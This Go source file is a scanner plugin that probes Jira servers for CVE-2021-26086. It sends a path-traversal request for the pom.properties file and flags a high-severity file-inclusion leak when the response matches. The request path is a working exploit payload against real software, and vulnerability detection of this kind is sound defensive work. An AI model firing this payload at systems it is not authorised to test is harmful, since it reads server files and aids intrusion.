package web
/*
 * Thanks to https://twitter.com/HaboubiAnis for pointers on this plugin.
 */
import (
	"github.com/LeakIX/l9format"
	"strings"
)

type JiraPlugin struct {
	l9format.ServicePluginBase
}

func (JiraPlugin) GetVersion() (int, int, int) {
	return 0, 1, 0
}

func (JiraPlugin) GetName() string {
	return "JiraPlugin"
}

func (JiraPlugin) GetStage() string {
	return "open"
}

var JiraPluginRequests = []l9format.WebPluginRequest{
	{Method: "GET", Path: "/s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties"},
}

func (plugin JiraPlugin) GetRequests() []l9format.WebPluginRequest {
	return JiraPluginRequests
}

// Test leak from response
func (plugin JiraPlugin) Verify(request l9format.WebPluginRequest, response l9format.WebPluginResponse, event *l9format.L9Event, options map[string]string) bool {
	// Are we checking our requests ?
	if !request.EqualAny(JiraPluginRequests) {
		return false
	}
	// Check for status code
	if response.Response.StatusCode != 200 {
		return false
	}
	// Check for something to avoid false positive :
	if strings.Contains(string(response.Body), "Maven") && !strings.Contains(string(response.Body), "<html") {
		event.Leak.Type = "lfi"
		event.Leak.Severity = "high"
		event.AddTag("cve-2021-26086")
		event.Summary = "Found pom.properties through CVE-2021-26086:\n" + string(response.Body)
		return true
	}
	return false
}